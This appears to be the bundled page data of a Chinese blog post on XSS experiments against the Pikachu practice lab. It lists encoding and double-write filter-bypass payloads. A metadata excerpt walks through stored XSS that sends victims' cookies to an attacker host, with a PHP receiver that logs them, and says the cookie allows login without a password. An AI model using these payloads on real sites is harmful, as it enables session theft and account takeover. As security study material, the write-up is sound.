style="--shiki-light:#986801;--shiki-dark:#E06C75;">#99</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">#114</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">#105</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">#112</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">#116</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">:alert(&#39;编码可用&#39;)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;编码可用&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>拆分跨站 仅存储型</p><div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" data-title="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//原始payload：</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    a=&quot;alert&quot;;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    a=a+&quot;(&#39;使用变量和函数调用alert&#39;)&quot;;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    eval(a);</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//拆分后payload：</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;a=&quot;alert&quot;;&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;a=a+&quot;(&#39;使用变量和函数调用alert&#39;)&quot;;&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;eval(a);&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>双写 leve7</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;&gt;&lt;a hrhrefef=&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">javascrscriptipt:alert(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;XSS&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;&gt;111&lt;/a&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>当字符被过滤可尝试双写绕过</p></li><li><p>10进制编码</p><div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" data-title="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//使用CharCode调用alert,也可以用eval执行</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//97,108,101,114,116,40,39,88,83,83,39,41解码后为alert(&#39;XSS&#39;)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>Unicode编码</p><div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" data-title="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;eval(&#39;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u0058\\u0053\\u0053\\u0027\\u0029\\u003b&#39;)&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//使用Unicode编码调用alert,也可以用eval执行</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>16进制编码</p><div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" data-title="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;eval(&quot;\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29&quot;)&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ol><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p>',89)]))}]]),f=JSON.parse('{"path":"/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/XSS%E5%AE%9E%E9%AA%8C.html","title":"XSS实验","lang":"zh-CN","frontmatter":{"title":"XSS实验","index":true,"icon":"x","isOriginal":true,"date":"2023-02-10T00:00:00.000Z","order":3,"category":["渗透测试"],"tag":["渗透测试","XSS实验"],"description":"XSS实验 通过存储型XSS获取被攻击者的cookie 首先，搞清楚原理，cookie在哪里？要发到那里？利用什么发？​3165839-20230505102219883-856345275​ 在web server 端构造如下payload payload提交后javascript脚本操纵DOM对象写入img标签，并且标签的url中拼接了用户的coo...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/blog/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/XSS%E5%AE%9E%E9%AA%8C.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"XSS实验"}],["meta",{"property":"og:description","content":"XSS实验 通过存储型XSS获取被攻击者的cookie 首先，搞清楚原理，cookie在哪里？要发到那里？利用什么发？​3165839-20230505102219883-856345275​ 在web server 端构造如下payload payload提交后javascript脚本操纵DOM对象写入img标签，并且标签的url中拼接了用户的coo..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-12T08:22:33.000Z"}],["meta",{"property":"article:tag","content":"渗透测试"}],["meta",{"property":"article:tag","content":"XSS实验"}],["meta",{"property":"article:published_time","content":"2023-02-10T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-12T08:22:33.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"XSS实验\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-02-10T00:00:00.000Z\\",\\"dateModified\\":\\"2025-01-12T08:22:33.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"]]},"headers":[{"level":2,"title":"通过存储型XSS获取被攻击者的cookie","slug":"通过存储型xss获取被攻击者的cookie","link":"#通过存储型xss获取被攻击者的cookie","children":[]},{"level":2,"title":"Pikachu的XSS实验","slug":"pikachu的xss实验","link":"#pikachu的xss实验","children":[{"level":3,"title":"存储型","slug":"存储型","link":"#存储型","children":[]},{"level":3,"title":"反射型(GET)","slug":"反射型-get","link":"#反射型-get","children":[]},{"level":3,"title":"反射型(POST)","slug":"反射型-post","link":"#反射型-post","children":[]},{"level":3,"title":"DOM型xss","slug":"dom型xss","link":"#dom型xss","children":[]},{"level":3,"title":"DOM型xss-x","slug":"dom型xss-x","link":"#dom型xss-x","children":[]},{"level":3,"title":"xss之href输出","slug":"xss之href输出","link":"#xss之href输出","children":[]}]},{"level":2,"title":"XSS与标签","slug":"xss与标签","link":"#xss与标签","children":[{"level":3,"title":"伪协议","slug":"伪协议","link":"#伪协议","children":[]}]},{"level":2,"title":"XSS变形","slug":"xss变形","link":"#xss变形","children":[]}],"git":{"createdTime":1736670153000,"updatedTime":1736670153000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":1,"url":"https://github.com/youze"}]},"readingTime":{"minutes":4.17,"words":1251},"filePathRelative":"perm/漏洞专题/XSS实验.md","localizedDate":"2023年2月10日","excerpt":"\\n<h2>通过存储型XSS获取被攻击者的cookie</h2>\\n<ol>\\n<li>\\n<p>首先，搞清楚原理，cookie在哪里？要发到那里？利用什么发？​​</p>\\n</li>\\n<li>\\n<p>在web server 端构造如下payload</p>\\n<div class=\\"language-bash line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"bash\\" data-title=\\"bash\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">payload1（不进行编码）：</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;script&gt;document.write(</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\'&lt;img src=\\"http://47.113.187.x:91/cookie.php?cookie=\'</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">+document.cookie+</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\'\\" width=0 height=0 border=0 /&gt;\'</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">);&lt;/script&gt;</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">payload2（base64编码）：</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;script&gt;document.write(</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\'&lt;img src=\\"http://192.168.43.18/xssGetCookie/getcookie.php?cookie=\'</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">+window.btoa(unescape(encodeURIComponent(escape(document.cookie))))+</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\'\\"&gt;\'</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">);&lt;/script&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div></li>\\n<li>\\n<p>payload提交后<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">javascript脚本操纵DOM对象写入img标签</span>，并且标签的url中拼接了用户的cookie值，当浏览器渲染页面时就会<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">GET形式</span>请求图片资源，并将<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">cookie值</span>携带到攻击者服务器。</p>\\n<p>​​</p>\\n</li>\\n<li>\\n<p>在攻击者服务器需要提供和payload路径对应的url给请求端访问，攻击者服务器获取GET中的cookie存储到文本文件中。</p>\\n<div class=\\"language-top line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"top\\" data-title=\\"top\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>&lt;?php //攻击端，用于接收被攻击端请求的信息</span></span>\\n<span class=\\"line\\"><span>$cookie = $_GET[\'cookie\']; //获取cookie信息</span></span>\\n<span class=\\"line\\"><span>$log =  fopen(\'cookie.txt\',\'a\'); //生成获取的cookie信息，打开文件，a是追加写模式</span></span>\\n<span class=\\"line\\"><span>fwrite($log,$cookie.PHP_EOL); //fwrite写入</span></span>\\n<span class=\\"line\\"><span>fclose($log);</span></span>\\n<span class=\\"line\\"><span>?&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div></li>\\n<li>\\n<p>查看文本文件，两个payload所请求的cookie。​</p>\\n<p>​</p>\\n<p>经过编码的cookie经过base64和URL解码如下</p>\\n<div class=\\"language-bash line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"bash\\" data-title=\\"bash\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">name</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">ichunqiu</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">; </span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">PHPSESSID</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">1iadqpfqbcrjqjfamfdmjchn2t</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">; </span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">_ga_P1JF3QTQ79</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">GS1.1.1726128058.2.0.1726128058.0.0.0</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div></li>\\n<li>\\n<p>当其他用户访问该网页</p>\\n<p>攻击者端生成如下cookie</p>\\n<p>​​</p>\\n</li>\\n<li>\\n<p>编码的cookie经过base64和URL解码如下</p>\\n<p>PHPSESSID=8mf3m5s9h457dlnqfjdmdi5st8</p>\\n</li>\\n<li>\\n<p>利用该cookie可以通过工具实现不用账号密码登录他人账户。</p>\\n</li>\\n</ol>","autoDesc":true}')}}]);